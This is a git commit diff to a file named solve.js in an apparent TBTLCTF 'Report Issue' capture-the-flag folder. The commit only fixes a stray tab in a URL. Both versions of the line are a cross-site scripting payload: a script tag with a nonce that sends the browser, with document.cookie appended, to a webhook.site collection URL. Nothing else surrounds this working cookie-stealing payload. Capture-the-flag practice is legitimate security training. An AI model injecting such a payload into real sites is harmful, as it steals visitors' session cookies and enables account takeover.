7537baaa6b0ee606b1959230b1fa3812bd3ded8e
NDC12345 <89791437+NDC12345@users.noreply.github.com>
2023-05-29 10:59:44 +0700

    Update solve.js

--- TBTLCTF/Report Issue/solve.js
+++ TBTLCTF/Report Issue/solve.js
@@ -1,3 +1,3 @@
 <script type="text/javascript" nonce="28088855">
-document.location="	https://webhook.site/d04b07cc-67cc-487f-ab4f-731e51a013d2/?flag="+document.cookie;
+document.location="https://webhook.site/d04b07cc-67cc-487f-ab4f-731e51a013d2/?flag="+document.cookie;
 </script>
